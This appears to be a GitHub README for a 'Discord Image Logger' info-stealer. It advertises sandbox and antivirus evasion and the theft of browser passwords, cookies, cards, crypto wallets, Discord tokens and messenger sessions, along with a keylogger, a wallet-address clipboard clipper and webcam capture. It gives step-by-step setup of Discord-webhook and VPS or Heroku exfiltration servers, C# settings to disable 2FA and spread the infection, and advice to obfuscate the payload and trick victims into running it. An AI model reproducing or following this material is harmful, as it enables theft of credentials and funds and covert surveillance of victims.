<div align="center">
<!------------------------------------------------------------------------------------------------------------>

# Discord Image Logger


## Unmasking a Sentinel: Triumph Over Surveillance

*Engaging Virtual Foes:* A tumultuous confrontation within VirtualBox, SandBox, and Debugger—an unwavering stance against simulated realms, defiant and unyielding.

*Stealth Beyond Scrutiny:* A vigilant spirit, skillfully eluding the ever-watchful eyes of VirusTotal and Any.Run, leaving no traces within their meticulous scrutinies.

![nees](https://github.com/QRAXDDL/ExtraSensoryPerception/assets/141562904/f655bc32-00fa-4cf8-ba72-4f1689e27f4c)


*Unveiling the Veil: System Insights:* Within the annals of information, uncover the fabric of system intricacies—Versions, CPUs, GPUs, RAM, IPs, BSSID, Location, Screen Metrics, and a tapestry of Installed Apps.

*Chromium Chronicles:* Journeying through the annals of Chromium-based browsers, unearthing the chronicles of passwords, credit cards, cookies, history, autofill, bookmarks—a treasure trove that whispers secrets of digital lives.



Browsers founded on the bedrock of Firefox (consisting of databases, cookies, historical imprints, and cherished bookmarks), Envoys of the Internet (a.k.a. Internet Explorer/Edge) harboring the secrets of passwords.

The annals of preserved wireless alliances, coupled with the probing of neighboring networks encircling the device (identified as SSID and BSSID), while a File Marauder lays claim to coveted treasures (ranging from documents, images, source codes, and databases, to the venerable USB).

Unveiling the dormant domains of banking and cryptocurrencies nestled within the precincts of browsing citadels.

Sessions woven intricately into the fabric of Steam, Uplay, Battle.Net, and Minecraft.

Embarking upon the installation of an unobtrusive sentinel - a keylogger and a clandestine clipper.

Unveiling the mysteries concealed within the domains of the desktop expanse, while the unblinking eye of the webcam captures fleeting vignettes of existence.

![image](https://user-images.githubusercontent.com/106811566/171858268-4f009c5f-ba70-4f63-b02d-8962271020f5.png)



The realm of VPNs unveils the triumvirate of ProtonVPN, OpenVPN, and NordVPN, alongside the cryptographic bastions known as Crypto Wallets.

Within the cryptographic dominion, a procession of names cascades forth: Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, Electrum, AtomicWallet, Guarda, Coinomi, Litecoin, Dash, and the venerable Bitcoin.

The expansive landscape of Crypto Wallets unfurls, both as sovereign entities and seamless Chrome and Edge extensions: Binance, coin98, Phantom, Mobox, XinPay, Math10, Metamask, BitApp, Guildwallet, iconx, Sollet, Slope Wallet, Starcoin, Swash, Finnie, KEPLR, Crocobit, OXYGEN, Nifty, Liquality, Auvitas wallet, Math wallet, MTV wallet, Rabet wallet, Ronin wallet, Yoroi wallet, ZilPay wallet, Exodus, Terra Station, and the trusted Jaxx.

Ephemeral discourse is embodied by the likes of Messenger Sessions, the digital portraits of Accounts, and the enigmatic Tokens. Discord, Telegram, ICQ, Skype, Pidgin, Outlook, Tox, Element, and Signal comprise this eclectic congregation.

In the labyrinthine corridors of directories, the Filezilla hosts stand sentinel, while the procession of processes assumes a tangible form. The key to system entry, colloquially known as the Product Key, bears its own mystique. A choreographed dance of initiation is orchestrated by the Autorun module.

🎹 Unveiling the Keylogger: As if plucking notes from an arcane symphony, the Keylogger awakens when the user engages in textual exchanges or traverses the domains of financial institutions.

📋 The Clipper Chronicle: An artistic act of substitution, the Clipper emerges from the shadows, deftly altering crypto wallet addresses within the clipboard, as transactions unfurl.

📷 Candid Chronicles of the Webcam: The visual tapestry of the user's digital odyssey is interwoven with snapshots captured from the ocular domain, awakening when the user's gaze falls upon titillating spectacles within the realm of the Internet.


## Distinctive Attributes
 - Absence of Local Caching: A realm untainted by cached remnants, ensuring a pristine transactional journey.
 - Discord Webhook-Powered Transfers: Embarking on voyages of communication, data traverses the digital seas via the vessel of Discord webhooks.
 - Multidimensional Token Pursuit: The relentless quest spans across diverse realms - Discord, Discord PTB, Discord Canary, Google Chrome, Opera, Brave, and Yandex - to unearth the coveted authorization tokens.
 - Organic Self-Reliance: An autonomous entity, devoid of dependencies on external Python modules, navigating the labyrinthine corridors of functionality with innate prowess.
 - \[**forthcoming**\] Universality Envisioned: The horizon holds a vision of inclusivity, a promise of seamless operation across a multitude of platforms.



## Usage Guidelines
1. Begin by establishing a webhook on your designated Discord server. For optimal security, it is prudent to create a new server dedicated to this purpose.
2. Navigate to the heart of the matter by configuring the 'WEBHOOK_URL' variable within [token-grabber.py](token-grabber.py) to mirror your bespoke Discord webhook URL.
3. *(Employ subterfuge to obscure the code or discreetly integrate it within another script.)*
4. Initiate the orchestrated symphony by transmitting the script to your intended recipient, enticing them to execute it.

## Array of Capabilities
* Acquirement of Discord Intelligence
  * User Alias
  * Email Address
  * Contact Number
  * Nitro Classification
  * Identifier
* Procurement of Discord Cipher
  * Primary Discord Realm
  * Discord Public Test Build Realm
  * Discord Development Realm
* Retrieval of Discord Security Matrix: Encompassing instances of password alteration, email modification, and account ingress.
  * Discord Principal Domain
  * Discord Public Test Build Domain
  * Discord Development Domain
  


## Instructions for Deployment

### Method #1: VPS-based API Hosting

#### Step 1: VPS Provisioning
- Establishing a Virtual Private Server (VPS) is imperative for this approach.

#### Step 2: Port Exposure and Server Setup
- Inaugurate the ingress of traffic through port 80.
- Install Apache2 by executing the commands:
  ```
  $ sudo apt-get update
  $ sudo apt-get install apache2
  ```
- Test the server's responsiveness with:
  ```
  $ curl urserverurl
  ```
  
#### Step 3: Firewall Configuration
- Permit Apache to operate freely via:
  ```
  $ sudo ufw allow 'Apache'
  ```
- Confirm the modification's effectiveness:
  ```
  $ sudo ufw status
  ```

#### Step 4: API Installation
- Secure the API repository:
  ```
  $ git clone https://github.com/Stanley-GF/api.git
  ```

#### Step 5: Configuration of Index.js
- Navigate to the API directory:
  ```
  $ cd api
  ```
- Open and modify the main index.js file:
  ```
  $ nano index.js
  ```
- Configure port and IP settings in index.js file to suit your requirements.

#### Step 6: Webhook URL Integration
- Traverse to the endpoints subdirectory:
  ```
  $ cd api/endpoints
  ```
- Access the index.js file for configuration:
  ```
  $ nano index.js
  ```
- Customize the webhook URL to align with your specifications.

#### Step 7: Final URL
- The culmination of this intricate endeavor yields your API URL:
  ```
  http://your-vps-ip/api/v1/send
  ```
  Replace "your-vps-ip" with your actual VPS IP address.


### Method #2: The Heroku Solution (Ideal for Novices)

1. Embark on the Journey: 
   - Initiate the process by navigating to https://heroku.com.
   - Initiate your journey by registering for a new account.

2. App Conception:
   - Foster the inception of an application within the Heroku interface.

3. Harness the Power of GitHub:
   - Forge a connection between your Heroku endeavor and the GitHub realm by forking the repository located at https://github.com/Stanley-GF/api to your GitHub account.
   - Navigate to the "endpoints" directory within the repository.
   - Within the "index.js" file, unleash your creative prowess by replacing the default webhook URL with your bespoke one.

4. Deployment Decree:
   - Engage with the Heroku dashboard, accessible through https://dashboard.heroku.com/apps/.
   - Select the app you've meticulously crafted.
   - Within the "deploy" category, allow your gaze to settle on the concept of "deployment methods."
   - Evoke the magic of GitHub by opting for it as your preferred deployment method.
   - Initiate the harmonious connection between your Heroku realm and your GitHub realm by navigating through the OAuth authorization process.
   - Identify your repository by typing "api" in the "App Connected" search field and selecting your cherished project.
   - Bestow the gift of automation upon your deployment process by activating the "Automatic Deploy" feature.
   - Initiate the transformative ritual by pressing the "Deploy Branch" button.

5. The Grand Unveiling:
   - Witness the metamorphosis of your creation into a live server. Behold its URL:
     ```
     https://your-app-name.herokuapp.com/api/v1/send
     ```
     Replace "your-app-name" with your chosen app's title.

In this realm of simplicity, Heroku extends its hand to guide you through the enigmatic process of server deployment. With the orchestration of each step, you manifest your digital domain, one URL at a time.


## Alternative Approach: Executable Transformation

1. Project Assimilation:
   - Begin by acquiring the source code of the designated project.

2. Project Immersion:
   - Unveil the layers of the project by opening it within a suitable environment.
   - Within the realms of "settings.cs," beckon forth a world of customization:

```cs
public static bool disableMfa = false; // Disable 2-Factor Authentication (2FA).

public static bool restartDiscord = true; // Facilitate the renaissance of Discord post-injection.

public static bool spread = true; // A tenet eternally true: the client must be infected.

private static string serverurl = "https://your-app-name.herokuapp.com/api/v1/send"; // Transmute "your-app-name.herokuapp.com/api/v1/send" into your own API URL.

public static string Url = "https://cors-anywhere2.herokuapp.com/" + serverurl; // This thread woven in the fabric of connectivity shall remain untouched.
```

3. Genesis of the .exe:
   - Weave the threads of code into the tapestry of functionality by compiling the project.

4. The Reckoning:
   - Traverse the directory path `\ImageLogger\ImageLogger\bin\Debug`.

5. The Gift of Dissemination:
   - With your creation encapsulated within the .exe form, bestow it upon your chosen recipients.

6. Glimpses of Capture:
   - Immortalize the moments of intrigue with visual records that capture the essence of the grabber's potential.

![](https://cdn.discordapp.com/attachments/797933407476777012/798145821203628052/unknown.png)